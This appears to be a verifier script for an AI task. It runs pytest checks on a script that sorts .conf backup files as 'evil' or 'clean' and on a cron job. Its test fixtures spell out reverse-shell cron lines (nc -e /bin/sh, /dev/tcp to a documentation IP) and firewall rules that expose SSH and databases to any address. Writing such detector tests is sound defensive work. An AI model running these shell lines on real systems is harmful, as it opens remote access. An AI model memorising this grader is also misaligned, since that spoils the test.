#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
# test_final_state.py
import os
import json
import re
import subprocess
import pytest
import random
import secrets
import shutil
import tempfile

SCRIPT_PATH = "/home/user/restore_filter.py"
MANAGEMENT_CIDR = "198.51.100.0/24"


def test_script_exists():
    """Verify that the restore_filter.py script was created."""
    assert os.path.isfile(SCRIPT_PATH), "Script /home/user/restore_filter.py does not exist."


def test_cron_job_exists_and_correct():
    """Verify that the cron job file exists and contains the correct schedule and command."""
    cron_path = "/home/user/backup_cron_job"
    assert os.path.isfile(cron_path), f"Cron job file {cron_path} does not exist."
    with open(cron_path, "r") as f:
        content = f.read()

    pattern = r"15\s+3\s+\*\s+\*\s+\*\s+.*python3\s+/home/user/restore_filter\.py\s+/home/user/incoming_backups\s+>\s+/home/user/backup_scan\.log"
    assert re.search(pattern, content), f"Cron job content does not match the expected schedule and command. Found: {content}"


def run_script_on_corpus(corpus_path):
    """Helper to run the user's script and parse its JSON output."""
    cmd = ["python3", SCRIPT_PATH, corpus_path]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    except subprocess.TimeoutExpired:
        pytest.fail(f"Script timed out when running on {corpus_path}")

    assert result.returncode == 0, f"Script failed with return code {result.returncode}. Stderr: {result.stderr}"

    try:
        output_json = json.loads(result.stdout)
    except json.JSONDecodeError:
        pytest.fail(f"Script output is not valid JSON. Output: {result.stdout}")

    assert isinstance(output_json, dict), f"Script output must be a JSON object, got: {type(output_json).__name__}"
    return output_json


def test_adversarial_corpus_evil():
    """Verify that all files in the evil corpus are rejected (classified as 'evil')."""
    evil_corpus_path = "/app/corpus/evil"
    output = run_script_on_corpus(evil_corpus_path)

    expected_files = [f for f in os.listdir(evil_corpus_path) if f.endswith('.conf')]

    bypassed = []
    for f in expected_files:
        if output.get(f) != "evil":
            bypassed.append(f)

    if bypassed:
        pytest.fail(f"{len(bypassed)} of {len(expected_files)} evil bypassed: {', '.join(bypassed)}")


def test_adversarial_corpus_clean():
    """Verify that all files in the clean corpus are preserved (classified as 'clean')."""
    clean_corpus_path = "/app/corpus/clean"
    output = run_script_on_corpus(clean_corpus_path)

    expected_files = [f for f in os.listdir(clean_corpus_path) if f.endswith('.conf')]

    modified = []
    for f in expected_files:
        if output.get(f) != "clean":
            modified.append(f)

    if modified:
        pytest.fail(f"{len(modified)} of {len(expected_files)} clean modified: {', '.join(modified)}")


def test_runtime_generated_mixed_corpus():
    """Exercise both classifications together in a neutral, unpredictable directory."""
    corpus_path = tempfile.mkdtemp(prefix="scan_" + secrets.token_hex(6) + "_")
    try:
        cases = []

        # Publicly exposed sensitive ports are evil for both supported firewall tools.
        for port in (22, 3306, 5432):
            cases.append((f"ufw allow from 0.0.0.0/0 to any port {port}\n", "evil"))
            cases.append((f"iptables -A INPUT -s 0.0.0.0/0 -p tcp --dport {port} -j ACCEPT\n", "evil"))

        # SSH from any source other than the recovered management CIDR is evil.
        for source in ("203.0.113.0/24", "192.0.2.17/32"):
            cases.append((f"ufw allow from {source} to any port 22\n", "evil"))
            cases.append((f"iptables -A INPUT -p tcp --dport 22 -s {source} -j ACCEPT\n", "evil"))

        # Malicious strings count only in cron job definitions.
        cases.extend([
            ("17 4 * * * /usr/bin/nc -e /bin/sh 192.0.2.8 9001\n", "evil"),
            ("*/10 * * * * bash -i >& /tmp/session 2>&1\n", "evil"),
            ("0 1 * * 1 /bin/bash -c 'cat </dev/tcp/203.0.113.9/4444'\n", "evil"),
        ])

        # Configurations that violate none of the stated rules remain clean.
        cases.extend([
            (f"ufw allow from {MANAGEMENT_CIDR} to any port 22\n", "clean"),
            (f"iptables -A INPUT -p tcp --dport 22 -s {MANAGEMENT_CIDR} -j ACCEPT\n", "clean"),
            ("ufw allow from 0.0.0.0/0 to any port 80\n", "clean"),
            ("iptables -A INPUT -s 0.0.0.0/0 -p tcp --dport 443 -j ACCEPT\n", "clean"),
            ("15 3 * * * /usr/local/sbin/backup --quiet\n", "clean"),
            ("# ordinary server configuration\nservice_enabled=true\n", "clean"),
        ])

        random.SystemRandom().shuffle(cases)
        expected = {}
        for content, classification in cases:
            name = secrets.token_hex(10) + ".conf"
            with open(os.path.join(corpus_path, name), "w") as f:
                f.write(content)
            expected[name] = classification

        # Non-.conf files must not be included in the result.
        with open(os.path.join(corpus_path, secrets.token_hex(8) + ".txt"), "w") as f:
            f.write("ufw allow from 0.0.0.0/0 to any port 22\n")

        output = run_script_on_corpus(corpus_path)
        assert set(output.keys()) == set(expected.keys()), (
            f"Output keys do not exactly match the .conf files. Expected {sorted(expected)}, got {sorted(output)}"
        )
        assert output == expected, f"Incorrect classifications for generated mixed corpus: expected {expected}, got {output}"
    finally:
        shutil.rmtree(corpus_path, ignore_errors=True)
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
